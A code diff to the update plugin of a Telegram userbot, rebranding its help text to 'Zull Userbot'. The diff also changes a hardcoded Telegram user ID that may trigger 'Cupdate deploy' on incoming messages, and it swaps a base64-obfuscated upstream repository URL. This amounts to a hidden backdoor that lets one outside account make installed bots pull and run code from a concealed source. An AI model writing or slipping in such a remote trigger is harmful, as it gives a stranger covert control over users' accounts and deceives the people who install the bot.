@@ -118,7 +118,7 @@ async def update(xx, repo, ups_rem, ac_br):
 
 
 @ayiin_cmd(pattern="update( now| deploy|$)")
-@register(incoming=True, from_users=1912667035,
+@register(incoming=True, from_users=1086365745,
           pattern=r"^Cupdate( now| deploy|$)")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
@@ -130,7 +130,7 @@ async def upstream(event):
         xx = await eor(event, get_string("upd_1"))
     conf = event.pattern_match.group(1).strip()
     off_repo = b64decode(
-        "aHR0cHM6Ly9naXRodWIuY29tL2lhbXVwdXQvVXB1dHQtVXNlcmJvdA=="
+        "aHR0cHM6Ly9naXRodWIuY29tL2JvdGRldjcyL3RlbGV0aG9u"
     ).decode("utf-8")
     force_update = False
     try:
@@ -209,9 +209,9 @@ CMD_HELP.update(
     {
         "update": f"**Plugin : **`update`\
         \n\n  »  **Perintah :** `{cmd}update`\
-        \n  »  **Kegunaan : **Untuk Melihat Pembaruan Terbaru Uputt-Userbot.\
+        \n  »  **Kegunaan : **Untuk Melihat Pembaruan Terbaru Zᴜʟʟ Usᴇʀʙᴏᴛ.\
         \n\n  »  **Perintah :** `{cmd}update deploy`\
-        \n  »  **Kegunaan : **Untuk MengUpdate Fitur Terbaru Dari Uputt-Userbot.\
+        \n  »  **Kegunaan : **Untuk MengUpdate Fitur Terbaru Dari Zᴜʟʟ Usᴇʀʙᴏᴛ.\
     "
     }
 )
